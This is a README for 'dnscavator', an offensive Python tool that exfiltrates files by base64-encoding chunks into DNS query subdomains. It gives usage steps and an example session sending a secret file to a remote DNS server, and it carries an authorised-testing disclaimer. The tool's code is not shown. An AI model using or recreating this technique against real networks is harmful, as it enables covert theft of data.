# dnscavator
# DNScavator - DNS Data Exfiltration Tool

This Python script, `dnscavator.py`, is a tool for exfiltrating data via DNS queries. It splits a specified file into chunks, base64 encodes each chunk, and sends them as DNS queries to a designated DNS server.  The data is encoded within the subdomain part of the DNS query.

## Disclaimer

This tool is provided for educational and ethical testing purposes only. Using this tool for unauthorized data exfiltration is illegal and unethical. The author is not responsible for any misuse of this tool.

## Features

*   File chunking: Splits the input file into smaller chunks suitable for DNS payloads (approximately 250 bytes).
*   Base64 encoding: Encodes each chunk using Base64 for safe transmission within DNS queries.
*   DNS query generation: Constructs DNS queries with the encoded data in the subdomain.
*   UDP transport: Sends DNS queries over UDP.
*   User-friendly interface: Prompts the user for the file path and DNS server IP address.
*   ASCII art banner: Displays a stylized banner upon execution.

## Requirements

*   Python 3.x

## How to Use

1.  **Clone the repository (optional):** If you downloaded the code as a zip file, extract it.

2.  **Run the script:** Open a terminal or command prompt, navigate to the directory containing `dnscavator.py`, and execute it using:

    ```bash
    python dnscavator.py
    ```

3.  **Enter file path:** The script will prompt you to enter the path to the file you want to exfiltrate.  Make sure the file exists and you have read permissions.

4.  **Enter DNS server IP:**  Enter the IP address of the DNS server where you intend to send the data.  **Important:** This DNS server must be configured to receive and handle these queries.  A standard public DNS server will likely not work as the queries are malformed and will be rejected.  You will typically need a custom DNS server setup for receiving the data.

5.  **Data exfiltration:** The script will then split the file into chunks, encode them, and send them as DNS queries to the specified server. The progress and any errors will be displayed in the terminal.

## Example

python dnscavator.py
Enter the path to the file you want to send: my_secret_data.txt
Enter the IP address of the DNS server to send data to: 192.168.1.100

Starting data exfiltration...
File: my_secret_data.txt
DNS Server: 192.168.1.100

Sent chunk to 192.168.1.100
Sent chunk to 192.168.1.100
...
Data exfiltration complete!


## Important Considerations

*   **DNS Server Setup:**  This tool requires a specially configured DNS server to receive and process the DNS queries.  Standard DNS servers will likely ignore or reject these queries.  You will need to set up your own DNS server to capture the encoded data.
*   **Data Reconstruction:**  The receiving DNS server will need to reconstruct the original file from the received DNS query data.  This is not included in this script.
*   **DNS Payload Size:**  DNS has size limitations. This script uses a chunk size that is generally safe, but you might need to adjust it depending on your DNS server configuration.
*   **Network Conditions:**  Network issues may cause some chunks to be lost.  Error handling and retransmission mechanisms could be implemented for more robust exfiltration.
*   **Ethical Use:**  Use this tool responsibly and ethically.  Unauthorized data exfiltration is illegal.

## Author

4rk4n3

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.  (Add a LICENSE file if you wish to use an open-source license).
